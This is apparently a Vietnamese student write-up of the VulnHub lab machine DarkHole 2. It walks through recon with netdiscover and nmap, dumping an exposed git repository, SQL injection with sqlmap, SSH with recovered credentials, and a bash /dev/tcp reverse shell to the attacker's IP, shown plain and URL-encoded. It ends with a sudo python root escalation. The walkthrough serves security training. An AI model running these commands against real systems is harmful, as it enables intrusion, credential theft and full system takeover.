# LAB8: DARKHOLE 2
```
https://www.vulnhub.com/entry/darkhole-2,740/
```
## Chuẩn bị
* Kali linux: 10.3.0.165

![image](https://user-images.githubusercontent.com/92532460/224593255-5e2bc263-49ec-4dca-9053-21ccf5a3a133.png)

* Máy victim: Darkhole2

## Xác định mục tiêu
* Bước đầu tiên là chạy lệnh Netdetect để xác định địa chỉ IP của máy mục tiêu. Trong ảnh chụp màn hình bên dưới, Netdetect đã cung cấp cho chúng tôi danh sách tất cả các địa chỉ IP khả dụng. Nó có thể được nhìn thấy trong ảnh chụp màn hình sau đây
```
netdiscover -i eth0 -r 10.3.0.0/24
```

![image](https://user-images.githubusercontent.com/92532460/224593455-109acb82-3d6c-4ed7-bbb9-23e341479ac4.png)

* Xác định máy mục tiêu có IP là 10.3.0.184
* Chúng tôi hiện đang bắt đầu Nmap để thúc đẩy quá trình này. Chúng tôi đã thực hiện (-A) để liệt kê cổng mở và phát hiện ra thông tin cổng sau
```
nmap -A 10.3.0.184
```

![image](https://user-images.githubusercontent.com/92532460/224594165-b589fc18-7471-4a6d-a90c-62d6e417865b.png)

* Theo đầu ra Nmap, chúng tôi có

  * Một máy chủ SSH chạy trên cổng 22

  * Một dịch vụ HTTP đang chạy (Máy chủ Apache) trên cổng 80, cũng như một trang http-git
## Liệt kê
* Trước tiên, chúng tôi sẽ cố gắng sử dụng HTTP. Hãy kiểm tra cổng 80 để xem có điều gì thú vị xuất hiện không. Vì Máy chủ Apache đang lắng nghe trên cổng 80 nên chúng tôi có thể xác minh ngay lập tức trên trình duyệt.

![image](https://user-images.githubusercontent.com/92532460/224594399-0168350e-55ae-4a19-a372-2d039804ac57.png)

* Ngoại trừ trang đăng nhập, trang này không chứa thông tin hữu ích nào. Vì vậy, chúng tôi quyết định xem trước trang đăng nhập.

![image](https://user-images.githubusercontent.com/92532460/224594526-b3786443-e803-4285-b250-9a262b3ac290.png)

* Sau đó, chúng tôi quyết định xem trang http-git mà chúng tôi đã phát hiện ra trước đây trong quá trình quét  Nmap.

![image](https://user-images.githubusercontent.com/92532460/224594708-b426bf3e-bb64-49bc-bccd-5ad62620bda8.png)

* Chúng tôi đã giới thiệu một công cụ gọi là gitdumper để cải thiện tính thẩm mỹ của trang http-git này. Nó là một công cụ để có được một kho lưu trữ git từ một trang web để hiểu rõ hơn về tập dữ liệu.
```
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
```

![image](https://user-images.githubusercontent.com/92532460/224594868-e22e4946-0fc3-4c98-853b-f1a7de8e669e.png)

* Sau khi tải xuống công cụ, chúng tôi cố gắng chạy nó bằng python.

* Một điều khác mà chúng tôi phải làm là cung cấp cho họ một tên thư mục để lưu các nhật ký git này (trong trường hợp của chúng tôi, chúng tôi đặt tên này là bản sao lưu cho trang http-git này).

```
mkdir backup
python3 git_dumper.py http://10.3.0.184.git/ backup
```
![image](https://user-images.githubusercontent.com/92532460/224601987-fba1c07b-34fc-48b4-91cf-ab1b19b8fc90.png)

* Sau đó, chúng tôi đã truy cập thư mục sao lưu và tệp nhật ký có ba mục. Sử dụng git, chúng tôi đã mở một trong các mục để tiến hành trong phòng thí nghiệm này.

```
cd backup
git log
git diff a4d900a8d85e8938d3601f3cef113ee293028e10
```
![image](https://user-images.githubusercontent.com/92532460/224602150-4fb3234d-71ba-4440-a9ec-c71d944894e6.png)

![image](https://user-images.githubusercontent.com/92532460/224602233-521b5e99-6d15-43c0-85ec-e76fc1a98d61.png)

* Cuối cùng, chúng tôi đã phát hiện ra thông tin đăng nhập của trang đăng nhập được phát hiện trước đây trong quá trình lạm dụng http.
```
Email: lush@admin.com
Password: 321
```
## Khai thác
* Chúng tôi được chuyển hướng đến một trang lạ sau khi đăng ký trên trang đó, trang mà chúng tôi nghĩ là phù hợp với các chiến thuật liên quan đến SQL injection.

![image](https://user-images.githubusercontent.com/92532460/224602701-b73e500f-970a-48aa-94fb-e5ad0b105d7b.png)

* Vì vậy, chúng tôi đã sử dụng burpsuite để thu thập cookie của trang này. Nó sẽ thuận lợi cho chiến lược SQL injection của chúng ta

![image](https://user-images.githubusercontent.com/92532460/224602902-0cc9fddf-095a-4931-8c6a-b1a2666bab65.png)

* Những cookie này đã được lưu trong một tệp có tên “sql” bằng cách sử dụng lệnh ```vim```. Chúng tôi đã bắt đầu một cuộc tấn công sqlmap bằng tệp này, yêu cầu cơ sở dữ liệu.
```
vim sql
sqlmap -r sql --dbs --batch
```
![image](https://user-images.githubusercontent.com/92532460/224604772-2201c59c-6bbb-422a-8d21-e075a8045803.png)

* Chúng tôi đã thu được một số cơ sở dữ liệu chỉ trong vài phút. Vì vậy, chúng tôi đã bắt đầu một lệnh khác (sử dụng tham số -D) để kết xuất cơ sở dữ liệu có tên darkhole_2.
```
sqlmap -r sql -D darkhole_2 --dump-all --batch
```
![image](https://user-images.githubusercontent.com/92532460/224604924-42d70d99-65c1-4057-b5c7-776f25dd8971.png)

* Bây giờ, bằng cách sử dụng các thông tin đăng nhập ssh này, chúng tôi đã đăng nhập với người dùng Jehad và mở id của nó để xác thực nó.
```
user: jehad
password: fool
```
![image](https://user-images.githubusercontent.com/92532460/224605235-2bedef39-cb14-4389-9fec-d469f01e2266.png)

## Nâng cấp đặc quyền
* Đã đến lúc bắt đầu quá trình leo thang đặc quyền. Chúng tôi đã chuyển sang thư mục tmp và thử chạy tập lệnh Linpeas với curl. Đây là tập lệnh tìm kiếm các đường dẫn tiềm năng để nâng cao đặc quyền trên các máy chủ Linux và đánh dấu chúng để hiểu rõ hơn về các trường hợp có khả năng khai thác đó.
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
![image](https://user-images.githubusercontent.com/92532460/224605433-23573294-474e-4f39-a9fb-4ac16b83d524.png)

* Sau khi chạy nó, chúng tôi thấy rằng một trang PHP dành cho người dùng Losy đã có sẵn trên cổng máy chủ cục bộ 9999. Do đó, chúng tôi đã nghĩ ra một kế hoạch sử dụng chuyển tiếp cổng cục bộ để truy cập trang đó.

![image](https://user-images.githubusercontent.com/92532460/224605620-e8b75fb5-adfb-4036-9c70-c70e856160e9.png)

* Đầu tiên, chúng tôi đã đi đến thư mục đã đề cập trước đó và phát hiện ra tệp index.php. Điều này cho chúng tôi biết rằng chúng tôi có thể nhận được dấu nhắc lệnh (cmd) bằng cách sử dụng phương pháp chuyển tiếp cổng cục bộ đã thảo luận trước đó cho người dùng bị mất.
```
cd /opt/web
cat index.php
```
![image](https://user-images.githubusercontent.com/92532460/224605760-8f50d0c1-9e8a-4646-ad04-3327caa92367.png)

* Bây giờ là lúc để khởi động cuộc tấn công này. Chúng tôi cố gắng đăng nhập với tư cách là người dùng jehad, sử dụng thông tin chi tiết về chuyển tiếp cổng cục bộ được cung cấp trong các kết quả trên mà chúng tôi đạt được.
```
ssh jehad@10.3.0.184 -L 9999:localhost:9999
```
![image](https://user-images.githubusercontent.com/92532460/224605983-83fe930e-203a-4126-8c7a-3c2577f0a794.png)

* Sau đó, chúng tôi thấy dấu nhắc lệnh của người dùng trong trình duyệt web. Chúng tôi xác thực điều này bằng cách thu thập id của người dùng này.
```
http://127.0.0.1:9999/?cmd=id
```
![image](https://user-images.githubusercontent.com/92532460/224606087-5149e3a9-3ab6-4ada-bad5-11de5608695e.png)

* Sử dụng trình bao đảo ngược netcat trên trình duyệt này làm cmd của người dùng này. Chúng tôi đã thử một lệnh phương pháp tiêu chuẩn, nhưng nó không hoạt động trong trường hợp này. Vì vậy, chúng tôi đã thử cuộc tấn công này sau khi mã hóa nó bằng bộ giải mã burp.
```
bash -c 'bash -i >& /dev/tcp/10.3.0.165/4242 0>&1'
```
* Sau đó dùng công cụ URL encode ta được đoạn code sau
```
bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E3%2E0%2E165%2F4242%200%3E%261%27
```
![image](https://user-images.githubusercontent.com/92532460/224609147-029683fc-352e-4190-84ef-c7584eb34d0e.png)

* Thực hiện lệnh lắng nghe trên cổng 4242
```
nc -lnvp 4242
```
* Sau đó gán vào đường mạng ( nhớ chú ý sau khi gán trang web phải trong chế độ load trang)

![image](https://user-images.githubusercontent.com/92532460/224609287-379e0a9a-a007-4693-b424-75a0cd503f45.png)
* Thành công vào được reverse shell

![image](https://user-images.githubusercontent.com/92532460/224609021-e50389b0-fe1c-4f32-b2c6-47df89bca4a7.png)

## Leo thang đặc quyền root

* Phần leo thang đặc quyền gốc dễ dàng nhất có thể. Trên tệp .bash_history, chúng tôi thấy mật khẩu được đặt cố ý. history

![image](https://user-images.githubusercontent.com/92532460/224609645-9481fb1d-2a2d-47ce-bc3a-c6a1ef670857.png)

* Thấy được mật khẩu là ```gang```
* Sử dụng lệnh sau
```
sudo -lS
```

![image](https://user-images.githubusercontent.com/92532460/224609865-3557ecbd-b0b0-43b6-b2c0-44ec3b14be47.png)

* Chạy lệnh sau
```
sudo python3 -c 'import os; os.system("/bin/bash")'
```
![image](https://user-images.githubusercontent.com/92532460/224610003-a2db67cc-c651-4550-afd0-1ff54ab19d15.png)

* Thành công leo thang đặc quyền với root
